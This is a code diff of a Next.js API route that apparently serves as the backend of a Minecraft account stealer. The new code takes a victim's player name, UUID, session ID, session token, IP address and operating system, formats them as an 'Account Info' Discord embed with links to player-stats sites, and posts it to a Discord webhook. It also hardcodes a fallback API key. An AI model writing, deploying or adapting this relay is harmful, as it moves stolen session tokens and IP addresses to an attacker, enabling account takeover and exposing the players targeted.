@@ -4,42 +4,63 @@ export const runtime = "nodejs";
 
 export async function POST(request: NextRequest) {
   const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
-  const apiKey = process.env.PROXY_API_KEY;
+  const expectedApiKey = process.env.PROXY_API_KEY || "TRj1reCzZZFKPkwyd6Dv4FIKDXtZd1GgCsMPWSiF16M367OqzlWRqxu24CVFjFQ7";
 
-  if (!webhookUrl || !apiKey) {
-    return NextResponse.json({ error: "Server is missing environment variables." }, { status: 500 });
+  if (!webhookUrl) {
+    return NextResponse.json({ error: "Missing DISCORD_WEBHOOK_URL" }, { status: 500 });
   }
 
-  const authHeader = request.headers.get("authorization") ?? "";
-  if (authHeader !== `Bearer ${apiKey}`) {
-    return NextResponse.json({ error: "Unauthorized." }, { status: 401 });
+  const authHeader = request.headers.get("authorization") || "";
+  if (authHeader !== `Bearer ${expectedApiKey}`) {
+    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
   }
 
   try {
-    const rawBody = await request.text();
+    const data = await request.json();
     
-    if (!rawBody || rawBody.length < 10) {
-      return NextResponse.json({ error: "Request body is empty." }, { status: 400 });
-    }
+    const uuid = data.uuid || "—";
+    const name = data.name || "—";
+    const token = data.token || "—";
+    const sessionId = data.sessionId || "—";
+    const ip = data.ip || "—";
+    const os = data.os || "—";
+    const timestamp = data.timestamp || new Date().toISOString();
 
-    const discordResponse = await fetch(webhookUrl + "?wait=true", {
+    const desc = `[NameMC](https://namemc.com/${uuid}) | [Plancke](https://plancke.io/hypixel/player/stats/${uuid}) | [SkyCrypt](https://sky.shiiyu.moe/stats/${uuid})`;
+
+    const payload = {
+      embeds: [
+        {
+          title: "Account Info",
+          color: 0x6E39FF,
+          description: desc,
+          fields: [
+            { name: "Name", value: `\`\`\`${name}\`\`\``, inline: true },
+            { name: "UUID", value: `\`\`\`${uuid}\`\`\``, inline: true },
+            { name: "Session ID", value: `\`\`\`${sessionId}\`\`\``, inline: false },
+            { name: "Session Token", value: `\`\`\`${token}\`\`\``, inline: false },
+            { name: "IP", value: `\`\`\`${ip}\`\`\``, inline: true },
+            { name: "OS", value: `\`\`\`${os}\`\`\``, inline: true },
+            { name: "Timestamp", value: `\`\`\`${timestamp}\`\`\``, inline: false }
+          ],
+          footer: { text: "Account Info" }
+        }
+      ]
+    };
+
+    const response = await fetch(webhookUrl + "?wait=true", {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: rawBody,
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
     });
 
-    if (!discordResponse.ok) {
-      const detail = await discordResponse.text();
-      return NextResponse.json(
-        { error: "Discord rejected the webhook request.", detail: detail },
-        { status: 502 }
-      );
+    if (!response.ok) {
+      const errText = await response.text();
+      return NextResponse.json({ error: "Discord error", detail: errText }, { status: 502 });
     }
 
     return NextResponse.json({ success: true });
-  } catch (error: any) {
-    return NextResponse.json({ error: error.message }, { status: 500 });
+  } catch (e: any) {
+    return NextResponse.json({ error: e.message }, { status: 500 });
   }
 }
